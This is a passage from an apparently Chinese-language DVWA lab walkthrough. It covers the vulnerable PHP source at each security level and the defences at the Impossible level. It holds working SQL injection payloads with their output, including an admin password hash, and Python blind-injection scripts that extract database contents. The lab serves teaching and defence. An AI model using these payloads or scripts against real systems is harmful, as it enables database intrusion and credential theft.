class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_curr ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        $_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            $hide_form = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p><h1 id="SQL-Injection（SQL注入）"><a href="#SQL-Injection（SQL注入）" class="headerlink" title="SQL Injection（SQL注入）"></a>SQL Injection（SQL注入）</h1><h2 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2><p>SQL注入是可在生命中的了，不多说了，直接看代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一句直接拼接和SQL语句，导致注入，有回显，手工注入或者借用sqlmap就可以</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;2 order by 2#&#x2F;&#x2F;2列</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,2#</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查数据库和用户名</span><br><span class="line">1&#39; and 1&#x3D;2 union select user(),database()#</span><br><span class="line">root@localhost</span><br><span class="line">dvwa</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查表名</span><br><span class="line">1&#39; and 1&#x3D;2 union select group_concat(TABLE_NAME),2 from information_schema.TABLES where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">guestbook,users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查列名</span><br><span class="line">1&#39; and 1&#x3D;2 union select group_concat(column_name),2 from information_schema.COLUMNS where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查数据，admin的密码md5</span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,password from users where user&#x3D;&#39;admin&#39;#</span><br><span class="line">5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure><blockquote><p>过程中碰到一个错误：</p><p>Illegal mix of collations for operation ‘UNION’</p><p>说是字符集的错误，详情和解决方法见这两个链接：</p><p><a href="https://www.cnblogs.com/hongthink/p/6225468.html">https://www.cnblogs.com/hongthink/p/6225468.html</a></p><p><a href="http://www.111com.net/database/mysql/56096.htm">http://www.111com.net/database/mysql/56096.htm</a></p></blockquote><h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码利用<code>mysql_real_escape_string</code>函数对特殊符号<code>\x00,\n,\r,\,&#39;,&quot;,\x1a</code>进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p>我们可以通过burpsuite接收并控制id</p><p>由于单引号被转义，所以之前的payload会出错，尽量避免使用<code>&#39;</code>，也可以通过hex，16进制的形式，将必须的字符串做转换，从而绕过<code>mysql_real_escape_string</code>函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 order by 2# </span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,database()#</span><br><span class="line">查表</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">f14g15here,guestbook,users</span><br><span class="line"></span><br><span class="line">查列（用16进制绕过指定表名所需的&#39;）</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0×7573657273 #</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line">查数据</span><br><span class="line">1 union select 1,password from users where user&#x3D;0x61646d696e</span><br><span class="line">d78b6f30225cdc811adfe8d4e7c9fd34</span><br></pre></td></tr></table></figure><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><p>与Medium相比，多了<code>LIMIT 1</code> 想通过这种方式限制输出。然后用SESSION_ID 的方式，但实际上与Low级别的防护一样差。。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;;</span><br></pre></td></tr></table></figure><p>至于payload，Low级别的都可以用。。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">Surname: f14g15here,guestbook,users</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br></pre></td></tr></table></figure><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p><h1 id="SQL-Blind-Injection（SQL盲注）"><a href="#SQL-Blind-Injection（SQL盲注）" class="headerlink" title="SQL Blind Injection（SQL盲注）"></a>SQL Blind Injection（SQL盲注）</h1><h2 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2><p>盲注，没有数据的回显，只显示<code>userid</code>在数据库或者不在数据库中。没有任何过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>因为存在明显的两种条件表示是非，可以通过布尔盲注来注入得到数据。为了更贴近CTF，我增加了一条flag的表，作为测试。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">dic = <span class="keyword">string</span>.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.220.1/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;low&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line">def dbnameLength():</span><br><span class="line">    <span class="keyword">for</span> DBlen in range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = <span class="string">&quot;?id=1&#x27; and length(database())=&#123;&#125;%23&amp;Submit=Submit&quot;</span>.format(DBlen)</span><br><span class="line">        DBlen_url = url + PayloadofDBlen</span><br><span class="line">        response = s.get(DBlen_url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> TrueState in response:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line">def dbname():</span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            DBnamePayload = <span class="string">&quot;?id=1&#x27; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit&quot;</span>.format(i,str(c))</span><br><span class="line">            DBname_url = url + DBnamePayload</span><br><span class="line">            <span class="keyword">print</span>(DBnamePayload)</span><br><span class="line">            response = s.get(DBname_url,cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                DBname += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line">def tableName():</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            tableName_payload = <span class="string">&quot;?id=1&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit#&quot;</span>.format(str(i),str(c))</span><br><span class="line">            tableName_url = url + tableName_payload</span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.get(tableName_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                table_name += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line">def ColumnName(tablename):</span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            columnName_payload = <span class="string">&quot;?id=1&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit#&quot;</span>.format(tablename,str(i),str(c))</span><br><span class="line">            columnName_url = url + columnName_payload</span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.get(columnName_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.爆出指定表指定列的数据</span></span><br><span class="line">def flag(columname, tablename):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;%23&amp;Submit=Submit#&quot;</span>.format(columname,tablename,i,str(c))</span><br><span class="line">            flag_url = url + payload</span><br><span class="line">            response = s.get(flag_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                flag += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableNum()</span></span><br><span class="line">    tableName()</span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE f14g15here:f1ag</span></span><br><span class="line">    <span class="comment"># flag(&#x27;f1ag&#x27;,&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2><p>主要将<code>id</code>换成数字型注入，然后通过POST方法上传数据，通过下拉表单的方式试图避免id可控，但是通过写脚本和burp，id是可控的。还通过<code>mysqli_real_escape_string</code>转义单引号<code>’</code>。</p><p>可以通过16进制绕过必要的字符或者ascii码来判断</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;100 %23</span><br><span class="line">id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;0x64 %23</span><br></pre></td></tr></table></figure><p>直接放一下脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;medium&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;51ca1k3krm3iqvo0tsfhjiu8lu&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbnameLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> DBlen <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 and length(database())=&#123;&#125;%23&quot;</span>.format(DBlen), <span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">        response = s.post(url,cookies=cookies,data=PayloadofDBlen).text</span><br><span class="line">        <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">            print(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbname</span>():</span></span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            DBnamePayload = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1 and ascii(substr(database(),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(i,ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># DBname_url = url + DBnamePayload</span></span><br><span class="line">            <span class="comment"># print(DBnamePayload)</span></span><br><span class="line">            response = s.post(url,cookies=cookies,data=DBnamePayload).text</span><br><span class="line">            <span class="comment"># print(response)</span></span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                DBname += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tableName</span>():</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span 